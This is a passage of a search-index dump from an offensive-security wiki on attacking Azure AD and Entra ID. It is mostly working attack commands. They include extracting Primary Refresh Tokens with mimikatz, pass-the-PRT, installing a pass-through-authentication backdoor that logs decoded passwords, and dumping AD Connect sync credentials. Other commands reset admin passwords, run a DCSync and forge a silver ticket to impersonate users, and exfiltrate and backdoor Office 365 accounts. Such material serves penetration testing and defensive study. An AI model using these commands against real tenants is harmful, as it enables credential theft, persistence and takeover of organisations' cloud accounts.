directory <code>C:\\Users\\&lt;username&gt;\\.Azure</code></li> <li>azureProfile.json in the same directory contains information about subscriptions.</li> </ul> </li> <li> <p>Az PowerShell</p> <ul> <li>Az PowerShell stores access tokens in clear text in TokenCache.dat in the directory <code>C:\\Users\\&lt;username&gt;\\.Azure</code></li> <li>It also stores ServicePrincipalSecret in clear-text in AzureRmContext.json </li> <li>Users can save tokens using <code>Save-AzContext</code></li> </ul> </li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#refresh-token","title":"Refresh Token","text":"<ul> <li>Requesting a token using credentials     <pre><code>TODO\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#get-a-refresh-token-from-estsauth-cookie","title":"Get a Refresh Token from ESTSAuth Cookie","text":"<p><code>ESTSAuthPersistent</code> is only useful when a CA policy actually grants a persistent session. Otherwise, you should use <code>ESTSAuth</code>.</p> <pre><code>TokenTacticsV2&gt; Get-AzureTokenFromESTSCookie -ESTSAuthCookie \"0.AS8\"\nTokenTacticsV2&gt; Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie \"0.AbcAp..\"\n</code></pre>"},{"location":"cloud/azure/azure-access-and-token/#get-a-refresh-token-from-office-process","title":"Get a Refresh Token from Office process","text":"<ul> <li>trustedsec/CS-Remote-OPs-BOF <pre><code>load bofloader\nexecute_bof /opt/CS-Remote-OPs-BOF/Remote/office_tokens/office_tokens.x64.o --format-string i  7324\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#foci-refresh-token","title":"FOCI Refresh Token","text":"<p>FOCI allows applications registered with Azure AD to share tokens, minimizing the need for separate authentications when a user accesses multiple applications that are part of the same \"family.\"</p> <ul> <li>secureworks/family-of-client-ids-research/ - Research into Undocumented Behavior of Azure AD Refresh Tokens</li> </ul> <p>Generate tokens </p> <pre><code>roadtx gettokens --refresh-token &lt;refresh-token&gt; -c &lt;foci-id&gt; -r https://graph.microsoft.com \nroadtx gettokens --refresh-token &lt;refresh-token&gt; -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46\n</code></pre> <pre><code>scope               resource                                client                              \n.default            04b07795-8ddb-461a-bbee-02f9e1bf7b46    04b07795-8ddb-461a-bbee-02f9e1bf7b46\n                    1950a258-227b-4e31-a9cf-717495945fc2    1950a258-227b-4e31-a9cf-717495945fc2\n                    https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2\n                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46\n                    https://graph.windows.net               00b41c95-dab0-4487-9791-b9d2c32c80f2\n                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46\n                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2\n                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46\nFiles.Read.All      d3590ed6-52b3-4102-aeff-aad2292ab01c    d3590ed6-52b3-4102-aeff-aad2292ab01c\n                    https://graph.microsoft.com             3590ed6-52b3-4102-aeff-aad2292ab01c\n                    https://outlook.office.com              1fec8e78-bce4-4aaf-ab1b-5451cc387264\nMail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2\n                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2\n                    https://outlook.office365.com           00b41c95-dab0-4487-9791-b9d2c32c80f2\n</code></pre>"},{"location":"cloud/azure/azure-access-and-token/#primary-refresh-token","title":"Primary Refresh Token","text":"<p>A Primary Refresh Token (PRT) is a key artifact in the authentication and identity management process in Microsoft's Azure AD (Azure Active Directory) environment. The PRT is primarily used for maintaining a seamless sign-in experience on devices. </p> <p> A PRT is valid for 90 days and is continuously renewed as long as the device is in use. However, it's only valid for 14 days if the device is not in use. </p> <ul> <li>Use PRT token     <pre><code>roadtx browserprtauth --prt &lt;prt-token&gt; --prt-sessionkey &lt;session-key&gt;\nroadtx browserprtauth --prt roadtx.prt -url http://www.office.com\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#extract-prt-v1-pass-the-prt","title":"Extract PRT v1 - Pass-the-PRT","text":"<p>MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).</p> <ul> <li>Use mimikatz to extract the PRT and session key     <pre><code>mimikatz # privilege::debug\nmimikatz # token::elevate\nmimikatz # sekurlsa::cloudap\nmimikatz # sekurlsa::dpapi\nmimikatz # dpapi::cloudapkd /keyvalue:&lt;key-value&gt; /unprotect\nmimikatz # dpapi::cloudapkd /context:&lt;context&gt; /derivedkey:&lt;derived-key&gt; /Prt:&lt;prt&gt;\n</code></pre></li> <li>Use either roadtx or AADInternals to generate a new PRT token     <pre><code>roadtx browserprtauth --prt &lt;prt&gt; --prt-sessionkey &lt;clear-key&gt; --keep-open -url https://portal.azure.com\n\nPS&gt; Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1\nPS AADInternals&gt; $PRT_OF_USER = '...'\nPS AADInternals&gt; while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += \"=\"}\nPS AADInternals&gt; $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))\nPS AADInternals&gt; $ClearKey = \"XXYYZZ...\"\nPS AADInternals&gt; $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&amp;,' -split ',' -ne ''))\nPS AADInternals&gt; New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#extract-prt-on-device-with-tpm","title":"Extract PRT on Device with TPM","text":"<ul> <li>No method known to date.</li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#request-a-prt-using-the-refresh-flow","title":"Request a PRT using the Refresh Flow","text":"<ul> <li>Request a nonce from AAD: <code>roadrecon auth --prt-init -t &lt;tenant-id&gt;</code></li> <li>Use dirkjanm/ROADtoken or wotwot563/aad_prt_bof to initiate a new PRT request.</li> <li><code>roadrecon auth --prt-cookie &lt;prt-cookie&gt; --tokens-stdout --debug</code> or  <code>roadtx gettoken --prt-cookie &lt;x-ms-refreshtokencredential&gt;</code></li> <li>Then browse to login.microsoftonline.com  with a cookie <code>x-ms-RefreshTokenCredential:&lt;output-from-roadrecon&gt;</code> <pre><code>Name: x-ms-RefreshTokenCredential\nValue: &lt;Signed JWT&gt;\nHttpOnly: \u221a\n</code></pre></li> </ul> <p> Mark the cookie with the flags <code>HTTPOnly</code> and <code>Secure</code>.</p>"},{"location":"cloud/azure/azure-access-and-token/#request-a-prt-with-hybrid-device","title":"Request a PRT with Hybrid Device","text":"<p>Requirements:</p> <ul> <li>ADDS user credentials</li> <li>hybrid environment (ADDS and Azure AD)</li> </ul> <p>Use the user account to create a computer and request a PRT</p> <ul> <li>Create a computer account in AD: <code>impacket-addcomputer &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -dc-ip &lt;dc-ip&gt;</code></li> <li>Configure the computer certificate in AD with dirkjanm/roadtools_hybrid: <code>python setcert.py 10.10.10.10  -t '&lt;machine-account$&gt;' -u '&lt;domain&gt;\\&lt;machine-account$&gt;' -p &lt;machine-password&gt;</code></li> <li>Register the hybrid device in Azure AD with this certificate: <code>roadtx hybriddevice -c '&lt;machine-account&gt;.pem' -k '&lt;machine-account&gt;.key' --sid '&lt;device-sid&gt;' -t '&lt;aad-tenant-id&gt;'</code></li> <li> <p>Get a PRT with device claim</p> <pre><code>roadtx prt -c &lt;hybrid-device-name&gt;.pem -k &lt;hybrid-device-name&gt;.key -u &lt;username&gt;@h&lt;domain&gt; -p &lt;password&gt;\nroadtx browserprtauth --prt &lt;prt-token&gt; --prt-sessionkey &lt;prt-session-key&gt; --keep-open -url https://portal.azure.com\n</code></pre> </li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#upgrade-refresh-token-to-prt","title":"Upgrade Refresh Token to PRT","text":"<ul> <li>Get correct token audience: <code>roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net --refresh-token file</code></li> <li>Registering device: <code>roadtx device -a register -n &lt;device-name&gt;</code></li> <li>Request PRT <code>roadtx prt --refresh-token &lt;refresh-token&gt; -c &lt;device-name&gt;.pem -k &lt;device-name&gt;.key</code></li> <li>Use a PRT: <code>roadtx browserprtauth --prt &lt;prt-token&gt; --prt-sessionkey &lt;prt-session-key&gt; --keep-open -url https://portal.azure.com</code></li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#enriching-a-prt-with-mfa-claim","title":"Enriching a PRT with MFA claim","text":"<ul> <li>Request a special refresh token: <code>roadtx prtenrich -u username@domain</code></li> <li>Request a PRT with MFA claim: <code>roadtx prt -r &lt;refreshtoken&gt; -c &lt;device&gt;.pem -k &lt;device&gt;.key</code></li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#references","title":"References","text":"<ul> <li>Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema - April 16, 2020</li> <li>Hacking Your Cloud: Tokens Edition 2.0 - Edwin David - April 13, 2023</li> <li>Microsoft 365 Developer Program</li> <li>PRT Abuse from Userland with Cobalt Strike - 0xbad53c</li> <li>Pass-the-PRT attack and detection by Microsoft Defender for \u2026 - Derk van der Woude - Jun 9</li> <li>Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert - AADInternals.com - September 01, 2020</li> <li>Get Access Tokens for Managed Service Identity on Azure App Service</li> <li>Attacking Azure Cloud shell - Karl Fosaaen - December 10, 2019</li> <li>Azure AD Pass The Certificate - Mor - Aug 19, 2020</li> <li>Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020</li> <li>Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020</li> </ul>"},{"location":"cloud/azure/azure-ad-connect/","title":"Azure AD Connect","text":"Active Directory Azure AD LDAP REST API'S NTLM/Kerberos OAuth/SAML/OpenID Structured directory (OU tree) Flat structure GPO No GPO's Super fine-tuned access controls Predefined roles Domain/forest Tenant Trusts Guests <p>Check if Azure AD Connect is installed : <code>Get-ADSyncConnector</code></p> <ul> <li>For PHS, we can extract the credentials<ul> <li>Passwords from on-premise AD are sent to the cloud</li> <li>Use replication via a service account created by AD Connect</li> </ul> </li> <li>For PTA, we can attack the agent<ul> <li>Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text</li> </ul> </li> <li>For Federation, connect Windows Server AD to Azure AD using Federation Server (ADFS)<ul> <li>Dir-Sync : Handled by on-premise Windows Server AD, sync username/password</li> <li>extract the certificate from ADFS server using DA</li> </ul> </li> </ul>"},{"location":"cloud/azure/azure-ad-connect/#password-hash-synchronization","title":"Password Hash Synchronization","text":"<p>Get token for <code>SYNC_*</code> account and reset on-prem admin password</p> <pre><code>PS &gt; Import-Module C:\\Users\\Administrator\\Documents\\AADInternals\\AADInternals.psd1\nPS &gt; Get-AADIntSyncCredentials\n\nPS &gt; $passwd = ConvertToSecureString 'password' -AsPlainText -Force\nPS &gt; $creds = New-Object System.Management.Automation.PSCredential (\"&lt;Username&gt;@&lt;TenantName&gt;.onmicrosoft.com\", $passwd)\nPS &gt; GetAADIntAccessTokenForAADGraph -Credentials $creds \u2013SaveToCache\n\nPS &gt; Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId\nPS &gt; Set-AADIntUserPassword -SourceAnchor \"&lt;IMMUTABLE-ID&gt;\" -Password \"Password\" -Verbose\n</code></pre>"},{"location":"cloud/azure/azure-ad-connect/#pass-through-authentication","title":"Pass-Through Authentication","text":"<ol> <li>Check if PTA is installed : <code>Get-Command -Module PassthroughAuthPSModule</code></li> <li>Install a PTA Backdoor     <pre><code>PS AADInternals&gt; Install-AADIntPTASpy\nPS AADInternals&gt; Get-AADIntPTASpyLog -DecodePasswords\n</code></pre></li> </ol>"},{"location":"cloud/azure/azure-ad-connect/#federation","title":"Federation","text":"<ul> <li>Golden SAML</li> </ul>"},{"location":"cloud/azure/azure-ad-connect/#ad-connect-credentials","title":"AD Connect - Credentials","text":"<ul> <li>dirkjanm/adconnectdump - Dump Azure AD Connect credentials for Azure AD and Active Directory</li> </ul> Tool Requires code execution on target DLL dependencies Requires MSSQL locally Requires python locally ADSyncDecrypt Yes Yes No No ADSyncGather Yes No No Yes ADSyncQuery No (network RPC calls only) No Yes Yes <ul> <li>ADSyncDecrypt: Decrypts the credentials fully on the target host. Requires the AD Connect DLLs to be in the PATH. A similar version in PowerShell was released by Adam Chester on his blog.</li> <li>ADSyncGather: Queries the credentials and the encryption keys on the target host, decryption is done locally (python). No DLL dependencies.</li> <li>ADSyncQuery: Queries the credentials from the database that is saved locally. Requires MSSQL LocalDB to be installed. No DLL dependencies. Is called from adconnectdump.py, dumps data without executing anything on the Azure AD connect host.</li> </ul> <p>Credentials in ADSync : <code>C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf</code></p>"},{"location":"cloud/azure/azure-ad-connect/#ad-connect-dcsync-with-msol-account","title":"AD Connect - DCSync with MSOL Account","text":"<p>You can perform DCSync attack using the MSOL account.</p> <p>Requirements:   * Compromise a server with Azure AD Connect service   * Access to ADSyncAdmins or local Administrators groups</p> <p>Use the script azuread_decrypt_msol.ps1 from @xpn to recover the decrypted password for the MSOL account: * <code>azuread_decrypt_msol.ps1</code>: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545 * <code>azuread_decrypt_msol_v2.ps1</code>: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c</p> <p>Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.</p>"},{"location":"cloud/azure/azure-ad-connect/#ad-connect-seamless-single-sign-on-silver-ticket","title":"AD Connect - Seamless Single Sign On Silver Ticket","text":"<p>Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)</p> <p>Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account AZUREADSSOC is created in the on-prem AD.</p> <p> The password of the AZUREADSSOACC account never changes.</p> <p>Using https://autologon.microsoftazuread-sso.com/ to convert Kerberos tickets to SAML and JWT for Office 365 &amp; Azure</p> <ol> <li>NTLM password hash of the AZUREADSSOACC account, e.g. <code>f9969e088b2c13d93833d0ce436c76dd</code>.      <pre><code>mimikatz.exe \"lsadump::dcsync /user:AZUREADSSOACC$\" exit\n</code></pre></li> <li>AAD logon name of the user we want to impersonate, e.g. <code>elrond@contoso.com</code>. This is typically either his userPrincipalName or mail attribute from the on-prem AD.</li> <li>SID of the user we want to impersonate, e.g. <code>S-1-5-21-2121516926-2695913149-3163778339-1234</code>.</li> <li>Create the Silver Ticket and inject it into Kerberos cache:     <pre><code>mimikatz.exe \"kerberos::golden /user:elrond\n/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234\n/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd\n/target:aadg.windows.net.nsatc.net /service:HTTP /ptt\" exit\n</code></pre></li> <li>Launch Mozilla Firefox</li> <li>Go to about:config and set the <code>network.negotiate-auth.trusted-uris preference</code> to value <code>https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com</code></li> <li>Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.</li> </ol>"},{"location":"cloud/azure/azure-ad-connect/#references","title":"References","text":"<ul> <li>Introduction to Microsoft Entra Connect V2 - Microsoft</li> <li>TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory - Dirk-jan Mollema - 1st apr. 2019</li> <li>Impersonating Office 365 Users With Mimikatz - Michael Grafnetter - January 15, 2017</li> <li>Azure AD Overview - John Savill's Technical Training - Oct 7, 2014 </li> <li>Windows Azure Active Directory in plain English - Openness AtCEE - Jan 9, 2014</li> <li>Azure AD connect for RedTeam - Adam Chester @xpnsec -  2019-02-18</li> <li>Azure AD Kerberos Tickets: Pivoting to the Cloud - Edwin David - February 09, 2023</li> <li>DUMPING NTHASHES FROM MICROSOFT ENTRA ID - Secureworks</li> </ul>"},{"location":"cloud/azure/azure-devices-users-sp/","title":"Azure AD IAM","text":"<p>Root Management Group (Tenant) &gt; Management Group &gt; Subscription &gt; Resource Group &gt; Resource</p> <ul> <li>Users</li> <li>Devices</li> <li>Service Principals (Application and Managed Identities)</li> </ul>"},{"location":"cloud/azure/azure-devices-users-sp/#users","title":"Users","text":"<ul> <li>List users: <code>Get-AzureADUser -All $true</code></li> <li> <p>Enumerate groups</p> <pre><code># List groups\nGet-AzureADGroup -All $true\n\n# Get members of a group\nGet-AzADGroup -DisplayName '&lt;GROUP-NAME&gt;'\nGet-AzADGroupMember -GroupDisplayName '&lt;GROUP-NAME&gt;' | select UserPrincipalName\n</code></pre> </li> <li> <p>Enumerate roles: <code>Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Administrator'\" | Get-AzureADDirectoryRoleMember</code></p> </li> <li>List roles: <code>Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName</code></li> <li> <p>Add user to a group</p> <pre><code>$groupid = \"&lt;group-id&gt;\"\n$targetmember = \"&lt;user-id&gt;\"\n$group = Get-MgGroup -GroupId $groupid\n$members = Get-MgGroupMember -GroupId $groupid\nNew-MgGroupMember -GroupId $groupid -DirectoryObjectid $targetmember\n</code></pre> </li> </ul>"},{"location":"cloud/azure/azure-devices-users-sp/#dynamic-group-membership","title":"Dynamic Group Membership","text":"<p>Get groups that allow Dynamic membership: <code>Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}</code></p> <p>Rule example : <code>(user.otherMails -any (_ -contains \"vendor\")) -and (user.userType -eq \"guest\")</code>  Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group</p> <ol> <li>Open user's profile, click on Manage</li> <li>Click on Resend invite and to get an invitation URL</li> <li>Set the secondary email     <pre><code>PS&gt; Set-AzureADUser -ObjectId &lt;OBJECT-ID&gt; -OtherMails &lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com -Verbose\n</code></pre></li> </ol>"},{"location":"cloud/azure/azure-devices-users-sp/#administrative-unit","title":"Administrative Unit","text":"<p>Administrative Unit can reset password of another user</p> <pre><code>PS AzureAD&gt; Get-AzureADMSAdministrativeUnit -All $true\nPS AzureAD&gt; Get-AzureADMSAdministrativeUnit -Id &lt;ID&gt;\nPS AzureAD&gt; Get-AzureADMSAdministrativeUnitMember -Id &lt;ID&gt;\nPS AzureAD&gt; Get-AzureADMSScopedRoleMembership -Id &lt;ID&gt; | fl\nPS AzureAD&gt; Get-AzureADDirectoryRole -ObjectId &lt;RoleId&gt;\nPS AzureAD&gt; Get-AzureADUser -ObjectId &lt;RoleMemberInfo.Id&gt; | fl\n\nPS C:\\Tools&gt; $password = \"Password\" | ConvertToSecureString -AsPlainText -Force\nPS C:\\Tools&gt; (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq \"&lt;Username&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com\"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose\n</code></pre>"},{"location":"cloud/azure/azure-devices-users-sp/#convert-guid-to-sid","title":"Convert GUID to SID","text":"<p>The user's Entra ID is translated to SID by concatenating <code>\"S-1\u201312\u20131-\"</code> to the decimal representation of each section of the Entra ID.</p> <pre><code>GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]\nSID: S-1\u201312\u20131-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]\n</code></pre> <p>For example, the representation of <code>6aa89ecb-1f8f-4d92\u2013810d-b0dce30b6c82</code> is <code>S-1\u201312\u20131\u20131789435595\u20131301421967\u20133702525313\u20132188119011</code></p>"},{"location":"cloud/azure/azure-devices-users-sp/#devices","title":"Devices","text":""},{"location":"cloud/azure/azure-devices-users-sp/#list-devices","title":"List Devices","text":"<pre><code>Connect-AzureAD\nGet-AzureADDevice\n$user = Get-AzureADUser -SearchString \"username\"\nGet-AzureADUserRegisteredDevice -ObjectId $user.ObjectId -All $true\n</code></pre>"},{"location":"cloud/azure/azure-devices-users-sp/#device-state","title":"Device State","text":"<pre><code>PS&gt; dsregcmd.exe /status\n+----------------------------------------------------------------------+\n| Device State |\n+----------------------------------------------------------------------+\n AzureAdJoined : YES\n EnterpriseJoined : NO\n DomainJoined : NO\n Device Name : jumpvm\n</code></pre> <ul> <li>Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&amp;name=large</li> <li>Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&amp;name=large</li> <li>Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&amp;name=large</li> <li>Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&amp;name=large</li> </ul>"},{"location":"cloud/azure/azure-devices-users-sp/#join-devices","title":"Join Devices","text":"<ul> <li>Enroll Windows 10/11 devices in Intune</li> </ul>"},{"location":"cloud/azure/azure-devices-users-sp/#register-devices","title":"Register Devices","text":"<pre><code>roadtx device -a register -n swkdeviceup\n</code></pre>"},{"location":"cloud/azure/azure-devices-users-sp/#windows-hello-for-business","title":"Windows Hello for Business","text":"<pre><code>roadtx.exe prtenrich --ngcmfa-drs-auth\nroadtx.exe winhello -k swkdevicebackdoor.key\nroadtx.exe prt -hk swkdevicebackdoor.key -u &lt;user@domain.lab&gt; -c swkdeviceup.pem -k swkdeviceup.key\nroadtx browserprtauth --prt &lt;prt-token&gt; --prt-sessionkey &lt;prt-session-key&gt; --keep-open -url https://portal.azure.com\n</code></pre>"},{"location":"cloud/azure/azure-devices-users-sp/#bitlocker-keys","title":"Bitlocker Keys","text":"<pre><code>Install-Module Microsoft.Graph -Scope CurrentUser\nImport-Module Microsoft.Graph.Identity.SignIns\nConnect-MgGraph -Scopes BitLockerKey.Read.All\nGet-MgInformationProtectionBitlockerRecoveryKey -All\nGet-MgInformationProtectionBitlockerRecoveryKey -BitlockerRecoveryKeyId $bitlockerRecoveryKeyId\n</code></pre>"},{"location":"cloud/azure/azure-devices-users-sp/#service-principals","title":"Service Principals","text":"<pre><code>PS C:\\&gt; Get-AzureADServicePrincipal\n\nObjectId                             AppId                                DisplayName\n--------                             -----                                -----------\n00221b6f-4387-4f3f-aa85-34316ad7f956 e5e29b8a-85d9-41ea-b8d1-2162bd004528 Tenant Schema Extension App\n012f6450-15be-4e45-b8b4-e630f0fb70fe 00000005-0000-0ff1-ce00-000000000000 Microsoft.YammerEnterprise\n06ab01eb-3e77-4d14-ae31-322c7730a65b 09abbdfd-ed23-44ee-a2d9-a627aa1c90f3 ProjectWorkManagement\n092aaf41-23e8-46eb-8c3d-fc0ee91cc62f 507bc9da-c4e2-40cb-96a7-ac90df92685c Office365Reports\n0ac66e69-5502-4406-a294-6dedeadc8cab 2cf9eb86-36b5-49dc-86ae-9a63135dfa8c AzureTrafficManagerandDNS\n0c0a6d9d-48c0-4aa7-b484-4e46f77d8ed9 0f698dd4-f011-4d23-a33e-b36416dcb1e6 Microsoft.OfficeClientService\n0cbef08e-a4b5-4dd9-865e-8f521c1c5fb4 0469d4cd-df37-4d93-8a61-f8c75b809164 Microsoft Policy Administration Service\n0ea80ff0-a9ea-43b6-b876-d5989efd8228 00000009-0000-0000-c000-000000000000 Microsoft Power BI Reporting and Analytics&lt;/dev:code&gt;\n</code></pre>"},{"location":"cloud/azure/azure-devices-users-sp/#other","title":"Other","text":"<p>Lists all the client IDs you can use to get a token with the <code>mail.read</code> scope on the Microsoft Graph:</p> <pre><code>roadtx getscope -s https://graph.microsoft.com/mail.read\nroadtx findscope -s https://graph.microsoft.com/mail.read\n</code></pre>"},{"location":"cloud/azure/azure-devices-users-sp/#references","title":"References","text":"<ul> <li>Pentesting Azure Mindmap</li> <li>AZURE AD cheatsheet - BlackWasp</li> <li>Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020</li> <li>AZURE AD INTRODUCTION FOR RED TEAMERS - Aymeric Palhi\u00e8re (bak) - 2020-04-20</li> </ul>"},{"location":"cloud/azure/azure-enumeration/","title":"Azure AD Enumerate","text":""},{"location":"cloud/azure/azure-enumeration/#azure-ad-collectors","title":"Azure AD - Collectors","text":"<ul> <li>Microsoft Portals - Microsoft Administrator Sites</li> <li>ROADTool - A collection of Azure AD tools for offensive and defensive security purposes      <pre><code>roadrecon auth --access-token eyJ0eXA...\nroadrecon auth --prt-cookie &lt;primary-refresh-token&gt; -r msgraph -c \"1950a258-227b-4e31-a9cf-717495945fc2\"\nroadrecon gather\nroadrecon gui\n</code></pre></li> <li>BloodHoundAD/AzureHound - Azure Data Exporter for BloodHound     <pre><code>./azurehound --refresh-token &lt;refresh-token&gt; list --tenant \"&lt;target-tenant-id&gt;\" -o output.json\n./azurehound -u \"&lt;username&gt;@contoso.onmicrosoft.com\" -p \"&lt;password&gt;\" list groups --tenant \"&lt;tenant&gt;.onmicrosoft.com\"\n./azurehound -j \"&lt;jwt&gt;\" list users --tenant \"&lt;tenant&gt;.onmicrosoft.com\"\n</code></pre></li> <li>BloodHoundAD/BARK - BloodHound Attack Research Kit     <pre><code>. .\\BARK.ps1\n$MyRefreshTokenRequest = Get-AZRefreshTokenWithUsernamePassword -username \"user@contoso.onmicrosoft.com\" -password \"MyVeryCoolPassword\" -TenantID \"contoso.onmicrosoft.com\"\n$MyMSGraphToken = Get-MSGraphTokenWithRefreshToken -RefreshToken $MyRefreshTokenRequest.refresh_token -TenantID \"contoso.onmicrosoft.com\"\n$MyAADUsers = Get-AllAzureADUsers -Token $MyMSGraphToken.access_token -ShowProgress\n</code></pre></li> <li>dafthack/GraphRunner - A Post-exploitation Toolset for Interacting with the Microsoft Graph API     <pre><code>Invoke-GraphRecon -Tokens $tokens -PermissionEnum\nInvoke-DumpCAPS -Tokens $tokens -ResolveGuids\nInvoke-DumpApps -Tokens $tokens\nGet-DynamicGroups -Tokens $tokens\n</code></pre></li> <li>NetSPI/MicroBurst - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping     <pre><code>PS C:&gt; Import-Module .\\MicroBurst.psm1\nPS C:&gt; Import-Module .\\Get-AzureDomainInfo.ps1\nPS C:&gt; Get-AzureDomainInfo -folder MicroBurst -Verbose\n</code></pre></li> <li>hausec/PowerZure - PowerShell framework to assess Azure security     <pre><code>PS C:&gt; Import-Module .\\Powerzure.psd1\nPS C:&gt; Set-Subscription -Id [idgoeshere]\nPS C:&gt; Get-AzureTarget\nPS C:&gt; Get-AzureInTuneScript\nPS C:&gt; Show-AzureKeyVaultContent -All\n</code></pre></li> <li>Flangvik/TeamFiltration - TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts     <pre><code>TeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --exfil --cookie-dump C:\\\\CookieData.txt --all\nTeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --exfil --aad \nTeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --exfil --tokens C:\\\\OutputTokens.txt --onedrive --owa\nTeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000\nTeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --debug --exfil --onedrive\nTeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --enum --validate-teams\nTeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\\Clients\\2021\\FooBar\\OSINT\\Usernames.txt\nTeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --backdoor\nTeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --database\n</code></pre></li> <li>Azure/StormSpotter -  This repository has not been updated recently - Azure Red Team tool for graphing Azure and Azure Active Directory objects</li> <li>nccgroup/Azucar -  This repository has been archived - Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.</li> <li>FSecureLABS/Azurite Explorer -  This repository has not been updated recently - Enumeration and reconnaissance activities in the Microsoft Azure Cloud.</li> <li>cyberark/SkyArk -  This repository has not been updated recently - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.   </li> </ul>"},{"location":"cloud/azure/azure-enumeration/#azure-ad-user-enumeration","title":"Azure AD - User Enumeration","text":""},{"location":"cloud/azure/azure-enumeration/#enumerate-tenant-informations","title":"Enumerate Tenant Informations","text":"<ul> <li>Federation with Azure AD or O365     <pre><code>Get-AADIntLoginInformation -UserName &lt;USER&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com\nhttps://login.microsoftonline.com/getuserrealm.srf?login=&lt;USER&gt;@&lt;DOMAIN&gt;&amp;xml=1\nhttps://login.microsoftonline.com/getuserrealm.srf?login=root@&lt;TENANT NAME&gt;.onmicrosoft.com&amp;xml=1\n</code></pre></li> <li>Get the Tenant ID     <pre><code>Get-AADIntTenantID -Domain &lt;TENANT NAME&gt;.onmicrosoft.com\nhttps://login.microsoftonline.com/&lt;DOMAIN&gt;/.well-known/openid-configuration\nhttps://login.microsoftonline.com/&lt;TENANT NAME&gt;.onmicrosoft.com/.well-known/openid-configuration\n</code></pre></li> 